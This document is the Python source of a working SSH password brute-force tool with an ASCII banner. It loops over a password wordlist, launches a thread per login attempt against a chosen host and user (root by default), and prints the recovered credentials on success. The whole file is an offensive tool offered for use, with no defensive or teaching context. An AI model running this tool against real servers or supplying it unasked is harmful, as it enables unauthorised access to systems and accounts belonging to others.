#!/usr/bin/python3

import redssh
import argparse
import time
import colorama
import os
from threading import Thread

colorama.init(autoreset=True)
blue = colorama.Fore.BLUE
green = colorama.Fore.GREEN
red = colorama.Fore.RED
reset_color = colorama.Style.RESET_ALL

parser = argparse.ArgumentParser(description="Start a SSH bruteforce attack !")
parser.add_argument("--hostname", "-ip", type=str, default="localhost", help="Remote Ip of server. Default: localhost")
parser.add_argument("--port", "-p", type=int, default=8022, help="Port on which ssh is running. Default: 22")
parser.add_argument("--user", "-u", type=str, default="root", help="User of ther remote machine. Default: root")
parser.add_argument("--passlist", "-pl", type=str, default="passlist.txt", help="Path to the password list file. Default: passlist.txt")
parser.add_argument("--delay", "-d", type=float, default=0.5, help="Delay between attempts. Default: 0.5")
parser.add_argument("--background", action="store_true", help="Only show successful attempts. Default: False")
args = parser.parse_args()

hostname = args.hostname
port = args.port
user = args.user
pass_file = args.passlist
delay = args.delay
background = args.background
pass_found = False
host_down = False
correct_password = None

def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):
        command = 'cls'
    os.system(command)

def showBanner():
	print(f'''{red}
                 d8b       d8b                                       
                 ?88       ?88                           d8P         
                  88b       88b                       d888888P       
 .d888b, .d888b,  888888b   888888b   88bd88b?88   d8P  ?88'   d8888b
 ?8b,    ?8b,     88P `?8b  88P `?8b  88P'  `d88   88   88P   d8b_,dP
   `?8b    `?8b  d88   88P d88,  d88 d88     ?8(  d88   88b   88b    
`?888P' `?888P' d88'   88bd88'`?88P'd88'     `?88P'?8b  `?8b  `?888P'

-- Developer: @thexcoderz -------------------------------------------''')
	print(f'''{green}
---------------------------------------------------------------------
	''')

def ssh_connect(password):
	ssh = redssh.RedSSH(ssh_host_key_verification=redssh.enums.SSHHostKeyVerify.auto_add)
	try:
		ssh.connect(hostname, port=port, username=user, password=password)
		print(f"{green}Correct Password{reset_color} : {password}")
		ssh.exit()
		global pass_found, correct_password
		correct_password = password
		pass_found = True
		correct_pass_found()
		quit()
	except Exception as err:
		global host_down
		if err.args[0] == 111:
			print(f"{red}Connection Refused, Host seems down. Stopping Attack")
			host_down = True
			quit()
		elif err.args[0] == 7:
			print(f"{red}Connection Refused, Host seems down. Stopping Attack")
			host_down = True
			quit()
		else:
			if not background:
				if not pass_found:
					print(f"{red}Wrong Password - {password} ")

def correct_pass_found():
	clearConsole()
	showBanner()
	print(f"{blue}[+]{reset_color} Password Found\n")
	print(f"{blue}[+]{reset_color} {green}Server:{reset_color} ssh://{hostname}:{port}")
	print(f"{blue}[+]{reset_color} {green}User:{reset_color} {user}")
	print(f"{blue}[+]{reset_color} {green}Password:{reset_color} {correct_password}")

if __name__=="__main__":
	clearConsole()
	showBanner()
	try:
		with open(pass_file) as f:
			pass_list = f.read().split("\n")
			print(f"{blue}[+]{reset_color} {green}Starting bruteforce attact on ssh://{hostname}:{port} for user: {user}\n")
			for password in pass_list:
				if not pass_found and not host_down:
					t = Thread(target=ssh_connect, args=(password,))
					t.start()
					time.sleep(delay)
				else:
					if pass_found:
						break
					else:
						break
	except FileNotFoundError:
		print(f"{red}Password List file not found.")
		exit()
